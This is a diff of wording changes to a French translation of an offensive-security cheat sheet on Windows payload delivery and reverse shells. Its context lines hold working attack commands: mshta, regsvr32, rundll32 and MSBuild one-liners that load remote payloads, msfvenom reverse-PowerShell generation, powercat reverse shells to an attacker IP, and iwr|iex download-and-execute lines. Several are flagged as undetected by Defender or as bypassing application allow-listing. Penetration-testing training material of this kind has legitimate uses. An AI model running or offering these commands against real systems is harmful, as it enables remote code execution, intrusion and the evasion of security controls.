@@ -167,7 +167,7 @@ Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given
 
 [**Exemple de DLL hello world**](https://github.com/carterjones/hello-world-dll)
 
-- [À partir d'ici](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+- [D'ici](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```bash
 rundll32 \\webdavserver\folder\payload.dll,entrypoint
 ```
@@ -224,7 +224,7 @@ regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 #### Regsvr32 -sct
 
 [**À partir d'ici**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
-```markup
+```html
 <?XML version="1.0"?>
 <!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
 <!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
@@ -253,7 +253,7 @@ run
 
 ## Certutil
 
-- [Ici](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+- [D'ici](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 
 Téléchargez un B64dll, décodez-le et exécutez-le.
 ```bash
@@ -280,7 +280,7 @@ msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > sh
 \\webdavserver\folder\batchfile.bat
 ```
 Processus effectuant un appel réseau : **svchost.exe**\
-Charge utile écrite sur le disque : **cache local du client WebDAV**
+Charge utile écrite sur le disque : **WebDAV client cache local**
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
 impacket-smbserver -smb2support kali `pwd`
@@ -328,11 +328,11 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 
 ## Msbuild
 
-- [À partir d'ici](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+- [D'ici](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
-Vous pouvez utiliser cette technique pour contourner les restrictions de Whitelisting d'application et de Powershell.exe. Vous serez invité à utiliser un shell PS.\
+Vous pouvez utiliser cette technique pour contourner les restrictions de liste blanche d'application et de Powershell.exe. Vous serez invité avec un shell PS.\
 Il vous suffit de télécharger ceci et de l'exécuter : [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
@@ -345,7 +345,7 @@ Compiler le code C# sur la machine de la victime.
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
-Vous pouvez télécharger un shell inversé C# de base ici : [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
+Vous pouvez télécharger un reverse shell C# de base ici : [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
 **Non détecté**
 
@@ -383,7 +383,7 @@ Commencez à servir le script sur un serveur web et exécutez-le du côté de la
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
-Defender ne le détecte pas comme un code malveillant (encore, 3/04/2019).
+Defender ne le détecte pas comme un code malveillant (pour l'instant, 3/04/2019).
 
 **À FAIRE : Vérifier d'autres shells nishang**
 
@@ -395,7 +395,7 @@ Téléchargez, démarrez un serveur web, démarrez l'écouteur et exécutez-le d
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-Defender ne le détecte pas comme un code malveillant (encore, 3/04/2019).
+Defender ne le détecte pas comme un code malveillant (pour l'instant, 3/04/2019).
 
 **Autres options offertes par powercat :**
 
@@ -430,7 +430,7 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 
 
 [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
-Créez une version powershell de la porte dérobée metasploit en utilisant unicorn
+Créer une version powershell de la porte dérobée metasploit en utilisant unicorn
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
@@ -438,7 +438,7 @@ Démarrez msfconsole avec la ressource créée :
 ```
 msfconsole -r unicorn.rc
 ```
-Démarrez un serveur web servant le fichier _powershell_attack.txt_ et exécutez-le chez la victime :
+Démarrez un serveur web servant le fichier _powershell_attack.txt_ et exécutez-le sur la victime :
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
